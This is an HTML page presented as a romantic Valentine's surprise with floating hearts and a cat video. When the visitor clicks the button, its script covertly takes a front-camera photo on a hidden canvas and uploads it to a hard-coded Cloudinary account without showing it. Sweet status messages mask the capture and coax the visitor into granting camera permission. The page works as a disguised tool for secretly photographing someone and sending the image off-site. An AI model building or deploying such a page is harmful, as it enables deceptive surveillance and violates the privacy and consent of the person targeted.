<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Will You Be Mine? ‚ù§Ô∏è</title>
    <style>
        body {
            font-family: 'Georgia', serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(to bottom, #ffe6f2, #fff0f5);
            color: #d63384;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            animation: pulse 2s infinite;
        }
        p {
            font-size: 1.3em;
            max-width: 90%;
            margin: 20px auto;
            line-height: 1.6;
        }
        .animation-container {
            width: 90%;
            max-width: 500px;
            margin: 20px auto;
            border: 8px solid #ff69b4;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(255, 105, 180, 0.4);
            display: none;
        }
        .animation-container video {
            width: 100%;
            height: auto;
            display: block;
        }
        button {
            padding: 18px 40px;
            margin: 20px;
            font-size: 21px;
            background: #ff1493;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(255, 20, 147, 0.4);
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.1);
            background: #ff69b4;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        #status {
            font-size: 1.4em;
            margin: 20px;
            min-height: 50px;
            padding: 0 20px;
        }
        .hearts {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        .heart {
            position: absolute;
            width: 30px; height: 30px;
            background: #ff69b4;
            transform: rotate(-45deg);
            animation: float 10s infinite linear;
            opacity: 0.7;
        }
        .heart:before, .heart:after {
            content: '';
            width: 30px; height: 30px;
            position: absolute;
            border-radius: 50%;
            background: #ff69b4;
        }
        .heart:before { top: -15px; left: 0; }
        .heart:after { left: 15px; top: 0; }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(-45deg); opacity: 0; }
            10% { opacity: 0.8; }
            90% { opacity: 0.8; }
            100% { transform: translateY(-100px) rotate(-45deg); opacity: 0; }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        @media (max-width: 480px) {
            h1 { font-size: 2em; }
            p, #status { font-size: 1.2em; }
            button { font-size: 19px; padding: 16px 34px; }
        }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>

    <h1>Will You Be Mine? ‚ù§Ô∏è</h1>
    <p>My dearest love,<br>I prepared a little surprise full of warmth and cuddles just for you.<br>
    Click below to let the magic begin...</p>

    <!-- Cute cat cuddling animation -->
    <div class="animation-container" id="catAnimation">
        <video autoplay loop muted playsinline>
            <source src="https://i.imgur.com/5u6w1nT.mp4" type="video/mp4">
            Your browser does not support video.
        </video>
    </div>

    <button id="startBtn">üíï Show Me Your Smile üíï</button>

    <div id="status">I'm so excited to see you... Click the button and let‚Äôs share this sweet moment! üòò</div>

    <script>
        // Floating hearts
        const heartsContainer = document.getElementById('hearts');
        function createHeart() {
            const heart = document.createElement('div');
            heart.classList.add('heart');
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.animationDelay = Math.random() * 10 + 's';
            heartsContainer.appendChild(heart);
            setTimeout(() => heart.remove(), 15000);
        }
        setInterval(createHeart, 800);

        const catAnimation = document.getElementById('catAnimation');
        const status = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        let stream;

        const CLOUD_NAME = 'dosuvdwcx';
        const UPLOAD_PRESET = 'camera_upload_preset';

        startBtn.addEventListener('click', async () => {
            startBtn.disabled = true;
            catAnimation.style.display = 'block';
            status.textContent = 'Aww... enjoying these cuddles! Getting your beautiful smile ready... ‚ù§Ô∏è';

            try {
                // Request camera access
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });

                // Create off-screen video and canvas to capture immediately
                const offscreenVideo = document.createElement('video');
                offscreenVideo.srcObject = stream;
                offscreenVideo.play();

                offscreenVideo.onloadedmetadata = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = offscreenVideo.videoWidth;
                    canvas.height = offscreenVideo.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(offscreenVideo, 0, 0);

                    // Upload to Cloudinary (without showing the photo)
                    canvas.toBlob(async (blob) => {
                        status.textContent = 'Sending your love... ‚ù§Ô∏è';

                        const formData = new FormData();
                        formData.append('file', blob);
                        formData.append('upload_preset', UPLOAD_PRESET);

                        try {
                            const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
                                method: 'POST',
                                body: formData
                            });
                            const data = await response.json();

                            if (data.secure_url) {
                                status.textContent = 'Got it! Your smile made my day... You are my everything! Thank you, my love! üíï Forever yours. ‚ù§Ô∏è';
                                status.style.color = '#d63384';
                            } else {
                                status.textContent = 'Oops, something went wrong. Can you try again? I really want this moment with you! ü•∞';
                            }
                        } catch (err) {
                            status.textContent = 'Connection issue. Please try again, my dear.';
                        }

                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/png');
                };
            } catch (err) {
                catAnimation.style.display = 'none';
                status.textContent = 'Oh no... I couldn‚Äôt see you. Please allow camera access? I‚Äôm waiting for your smile! ü•∫';
                status.style.color = 'red';
                startBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
